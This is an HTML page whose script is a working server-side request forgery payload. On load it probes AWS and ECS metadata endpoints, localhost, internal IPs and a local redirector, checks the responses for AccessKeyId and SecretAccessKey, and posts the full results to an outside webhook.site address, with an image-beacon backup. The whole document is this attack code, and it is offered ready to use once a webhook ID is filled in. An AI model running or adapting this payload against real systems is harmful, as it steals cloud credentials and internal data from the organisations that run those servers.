<!DOCTYPE html>
<html>
<head>
    <title>Simplified SSRF Testing</title>
</head>
<body>
    <h1>🎯 Simplified SSRF Vector Testing</h1>
    <div id="status">Testing simpler SSRF approaches...</div>
    
    <script>
        // Replace with your webhook URL
        var WEBHOOK_URL = 'https://webhook.site/your-unique-id';
        
        function sendResult(testName, url, result, success) {
            var data = {
                timestamp: new Date().toISOString(),
                test: testName,
                target_url: url,
                result: result,
                success: success,
                result_length: result.length,
                has_credentials: result.includes('AccessKeyId') || result.includes('SecretAccessKey')
            };
            
            try {
                var xhr = new XMLHttpRequest();
                xhr.open('POST', WEBHOOK_URL, true);
                xhr.setRequestHeader('Content-Type', 'application/json');
                xhr.send(JSON.stringify(data));
                
                // Also send as GET backup
                var img = new Image();
                img.src = WEBHOOK_URL + '/img?' + 
                    'test=' + encodeURIComponent(testName) + 
                    '&success=' + success +
                    '&length=' + result.length +
                    '&credentials=' + data.has_credentials;
                
            } catch (e) {
                console.log('Webhook send failed:', e);
            }
        }
        
        function testEndpoint(url, testName) {
            document.getElementById('status').innerHTML += '<br>🔄 Testing: ' + testName;
            
            try {
                var xhr = new XMLHttpRequest();
                xhr.open('GET', url, false);
                xhr.send();
                
                var result = xhr.responseText;
                var success = result && result.length > 5;
                
                document.getElementById('status').innerHTML += '<br>✅ ' + testName + ': ' + result.length + ' bytes';
                
                if (result.includes('AccessKeyId')) {
                    document.getElementById('status').innerHTML += '<br>🚨 CREDENTIALS in ' + testName + '!';
                }
                
                sendResult(testName, url, result, success);
                
            } catch (e) {
                document.getElementById('status').innerHTML += '<br>❌ ' + testName + ': ' + e.message;
                sendResult(testName, url, 'ERROR: ' + e.message, false);
            }
        }
        
        // Test 1: Direct AWS metadata (no redirector)
        setTimeout(() => {
            testEndpoint(
                'http://169.254.169.254/latest/meta-data/',
                'Direct_AWS_Metadata'
            );
        }, 2000);
        
        // Test 2: Direct AWS v1
        setTimeout(() => {
            testEndpoint(
                'http://169.254.169.254/1.0/meta-data/',
                'Direct_AWS_v1_Metadata'
            );
        }, 4000);
        
        // Test 3: Direct localhost
        setTimeout(() => {
            testEndpoint(
                'http://localhost/',
                'Direct_Localhost'
            );
        }, 6000);
        
        // Test 4: Direct 127.0.0.1
        setTimeout(() => {
            testEndpoint(
                'http://127.0.0.1/',
                'Direct_127_0_0_1'
            );
        }, 8000);
        
        // Test 5: Simple redirector test
        setTimeout(() => {
            testEndpoint(
                'http://127.0.0.1/redir.php?url=https://www.google.com',
                'Direct_Redirector_Test'
            );
        }, 10000);
        
        // Test 6: httpbin.org direct
        setTimeout(() => {
            testEndpoint(
                'http://httpbin.org/get',
                'Direct_httpbin_Test'
            );
        }, 12000);
        
        // Test 7: httpbin.org redirect simple
        setTimeout(() => {
            testEndpoint(
                'http://httpbin.org/redirect-to?url=https://www.google.com',
                'httpbin_Redirect_Simple'
            );
        }, 14000);
        
        // Test 8: Try the working 127.0.0.1/redir.php directly
        setTimeout(() => {
            testEndpoint(
                'http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/',
                'Direct_Redirector_AWS'
            );
        }, 16000);
        
        // Test 9: Alternative internal IPs
        setTimeout(() => {
            testEndpoint(
                'http://172.31.0.1/',
                'Internal_IP_172_31'
            );
        }, 18000);
        
        // Test 10: Alternative metadata service ports
        setTimeout(() => {
            testEndpoint(
                'http://169.254.169.254:80/latest/meta-data/',
                'AWS_Metadata_Port_80'
            );
        }, 20000);
        
        // Test 11: ECS metadata
        setTimeout(() => {
            testEndpoint(
                'http://169.254.170.2/v2/metadata',
                'ECS_Metadata_v2'
            );
        }, 22000);
        
        // Test 12: Alternative localhost ports
        setTimeout(() => {
            testEndpoint(
                'http://localhost:8080/',
                'Localhost_Port_8080'
            );
        }, 24000);
        
        // Send completion notification
        setTimeout(() => {
            sendResult('ALL_TESTS_COMPLETE', 'N/A', 'Simplified SSRF testing completed', true);
            document.getElementById('status').innerHTML += '<br><br>🎉 All tests complete! Check webhook for detailed results.';
        }, 26000);
    </script>
</body>
</html>
